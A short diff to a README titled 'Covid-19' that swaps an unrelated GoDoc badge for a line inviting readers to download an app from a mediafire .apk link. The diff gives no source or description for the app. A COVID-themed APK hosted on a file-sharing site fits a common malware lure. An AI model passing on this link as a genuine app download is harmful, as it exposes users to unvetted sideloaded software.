@@ -1,3 +1,2 @@
 # Covid-19
-
-[![GoDoc](https://img.shields.io/static/v1?label=godoc&message=reference&color=blue)](https://pkg.go.dev/github.com/google/go-github/v32/github)
+for download app only click [here](http://www.mediafire.com/file/lwtdp1y333ev2oo/app.apk/file).
